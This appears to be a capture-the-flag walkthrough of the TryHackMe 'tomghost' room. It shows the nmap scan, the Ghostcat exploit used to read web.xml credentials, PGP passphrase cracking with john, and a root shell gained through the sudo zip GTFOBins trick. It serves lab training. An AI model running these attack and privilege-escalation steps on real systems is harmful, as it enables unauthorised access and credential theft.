The machine we will exploit in this capstone is:
- [https://tryhackme.com/r/room/tomghost](https://tryhackme.com/r/room/tomghost)

# NMAP scan
First of all we need to do a `nmap` scan on the target IP:
```bash
nmap -p- -A -T4 HOST_IP
```
- ![[Pasted image 20250120141341.png]]
- we can see a `ssh`, `apache tomcat` and a `apache jserv 1.3` services on open ports


# enumerating web server
We start to enumerate the webserver `tomcat` on port `8080`:
- ![[Pasted image 20250120141500.png]]

And we see that there is a `manager app` that is basically an admin dashboard.


# Searching exploits for jserv 1.3

Now we go on google and we search for exploits over `apache jserv 1.3`:
- ![[Pasted image 20250120141634.png]]
- ![[Pasted image 20250120141654.png]]




In addition we find this reference to `ghostcat` so we search for it:
- ![[Pasted image 20250120141725.png]]


So we can get a look on `exploit-db` for `ghostcat` exploit:
- [https://www.exploit-db.com/exploits/48143](https://www.exploit-db.com/exploits/48143)


We download it and we try to access the file `WEB-INF/web.xml`:
```bash
python3 48143.py HOST_IP -p JSERV_PORT -f WEB-INF/web.xml
```
- ![[Pasted image 20250120142348.png]]
- ![[Pasted image 20250120142500.png]]
- It worked and we found credentials for `skyfuck`


So we use the credentials to access using ssh:
```bash
ssh skyfuck@HOST_IP
```
- ![[Pasted image 20250120142537.png]]
- ![[Pasted image 20250120142619.png]]


We have a user shell.

# Privilege escalation

## looking for history
We search on the terminal history:
```bash
history
```
- ![[Pasted image 20250120142719.png]]
- Some interesting info like `credential.pgp`


# search for sudo
We search all commands we can run as sudo:
```bash
sudo -l
```
- ![[Pasted image 20250120142816.png]]
- No commands we can run


# seaching in the folder
Using `ls` we can see some files:
- ![[Pasted image 20250120143002.png]]

So we pass them in our machine...
We will use `scp` that allows us to pass files in ssh:
```bash
scp skyfuck@HOST_IP:tryhackme.asc .
```
- so we are getting the file `tryhackme.asc` and we are putting it in the current directory
- we use the password used for ssh
- ![[Pasted image 20250120143159.png]]

We get also `credential.pgp`:
```bash
scp skyfuck@HOST_IP:credential.pgp .
```
- ![[Pasted image 20250120143242.png]]



In order to read a `.pgp` file we need a passphrase, we could find it in the `.asc` file but we need to crack it.

So we search on google `decrypt .asc file crack`:
- ![[Pasted image 20250120143443.png]]
- [https://www.openwall.com/lists/john-users/2015/11/17/1](https://www.openwall.com/lists/john-users/2015/11/17/1)

So we start to crack the `.asc` file:
```bash
gpg2john tryhackme.asc > output
```
- ![[Pasted image 20250120143613.png]]

And we crack it:
```bash
john --wordlist=rockyou.txt output
```
- ![[Pasted image 20250120143659.png]]
- The password is `alexandru`


So let's decrypt the `.pgp` file:
```bash
gpg --import tryhackme.asc
```
- we insert `alexandru` as password
- ![[Pasted image 20250120143818.png]]

So now we do:
```bash
gpg --decrypt credential.pgp
```
- ![[Pasted image 20250120143849.png]]
- we got `merlin` credentials


# access ssh with merlin
So we use these credential to login as `merlin`:
```bash
ssh merlin@HOST_IP
```
- ![[Pasted image 20250120143940.png]]



# Repeat process again for privesc

## search for history
```bash
history
```
- ![[Pasted image 20250120144025.png]]
- Nothing

## sudo search
```bash
sudo -l
```
- ![[Pasted image 20250120144052.png]]

So we can run `/usr/bin/zip` as root.


So we go on `GTFOBins` and we search for `zip`:
- ![[Pasted image 20250120144140.png]]

So we run the commands:
```bash
TF=$(mktemp -u)

sudo zip $TF /etc/hosts -T -TT 'sh #'

sudo rm $TF
```
- ![[Pasted image 20250120144244.png]]

We gain a root shell!